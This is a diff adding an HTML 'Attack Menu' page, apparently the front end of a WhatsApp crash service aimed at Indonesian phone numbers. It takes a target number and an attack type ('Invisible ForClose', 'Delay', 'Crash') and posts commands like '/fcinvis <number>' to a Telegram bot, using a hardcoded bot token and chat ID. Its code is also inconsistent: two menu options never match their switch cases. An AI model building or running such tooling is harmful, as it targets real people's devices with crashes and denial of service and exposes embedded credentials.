@@ -1,0 +1,138 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Attack Menu</title>
+  <style>
+    body {
+      background-color: #000;
+      color: red;
+      font-family: 'Courier New', monospace;
+      margin: 0;
+      padding: 0;
+      text-align: center;
+    }
+
+    .container {
+      padding: 30px;
+    }
+
+    .title {
+      font-size: 28px;
+      font-weight: bold;
+      margin-top: 20px;
+      color: #ff0000;
+    }
+
+    .logo {
+      margin-top: 50px;
+      margin-bottom: 20px;
+    }
+
+    .logo img {
+      width: 150px;
+      height: auto;
+    }
+
+    input, select {
+      width: 80%;
+      padding: 14px;
+      margin: 15px 0;
+      background: #111;
+      border: 2px solid red;
+      color: red;
+      border-radius: 10px;
+      font-size: 16px;
+      outline: none;
+    }
+
+    .button {
+      background-color: #b10000;
+      color: #fff;
+      border: none;
+      padding: 15px 30px;
+      border-radius: 30px;
+      font-size: 18px;
+      cursor: pointer;
+      margin-top: 20px;
+      box-shadow: 0 0 10px red;
+    }
+
+    .button:hover {
+      background-color: #ff0000;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="title">Attack Menu SamsInfinity</div>
+
+    <div class="logo">
+      <img src="https://files.catbox.moe/dix5pa.jpg" alt="logo"/>
+    </div>
+
+    <input type="text" id="targetNumber" placeholder="Target number (e.g. 62812...)">
+
+    <select id="attackType">
+      <option>Invisible ForClose</option>
+      <option>Invisible Delay</option>
+      <option>Invisible Crash</option>
+    </select>
+
+    <button class="button" onclick="sendBug()">▶ SEND BUG</button>
+  </div>
+
+  <script>
+    function sendBug() {
+      const number = document.getElementById("targetNumber").value.trim();
+      const type = document.getElementById("attackType").value;
+      const token = "7432046690:AAFwGypADBwML-2I5xCDNdYeKVE3uenhJxE";
+      const chatId = "-1002532993003";
+
+      if (!number.startsWith("62")) {
+        alert("Nomor harus diawali dengan 62 tanpa spasi. Contoh: 62812xxxx");
+        return;
+      }
+
+      let message = "";
+
+      switch (type) {
+        case "Invisible ForClose":
+          message = `/fcinvis ${number}`;
+          break;
+        case "Delay Invis":
+          message = `/delay ${number}`;
+          break;
+        case "Invisible Blank":
+          message = `/crack ${number}`;
+          break;
+        default:
+          message = `/fcinvis ${number}`;
+      }
+
+      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: message
+        })
+      })
+      .then(response => {
+        if (response.ok) {
+          alert(`Bug Sedang diproses!\nTarget: ${number}\nJenis: ${type}\nHarap Tunggu 20mentit Sebelum Mengirim lagi`);
+        } else {
+          alert("Gagal mengirim ke Telegram.");
+        }
+      })
+      .catch(error => {
+        alert("Terjadi kesalahan.");
+        console.error(error);
+      });
+    }
+  </script>
+</body>
+</html>
